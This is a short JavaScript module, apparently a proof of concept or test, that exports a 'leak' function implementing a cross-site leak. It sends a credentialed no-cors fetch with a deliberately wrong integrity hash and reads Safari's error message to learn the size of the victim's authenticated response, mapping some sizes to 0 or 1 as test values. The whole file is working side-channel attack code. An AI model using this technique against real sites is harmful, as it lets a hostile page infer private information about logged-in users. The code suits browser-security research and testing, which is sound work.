const leak = async (url) => {
    return fetch(url, {
        credentials: 'include',
        mode: 'no-cors',
        integrity: 'sha256-aaaaa'
    })
    .catch((e) => {
        // Safari leaks Content Length
        console.debug(e.message)
        let leak = e.message.match(/Content length: (\d*), Expected content/)
        if(leak && leak[1]){
            // fixed sizes for test
            if(leak[1] === '221396'){
                return 0
            }
            else if(leak[1] === '917323'){
                return 1
            }
            else{
                return leak[1]
            }
        }
        else{
            return 0
        }
    })
}


export { leak }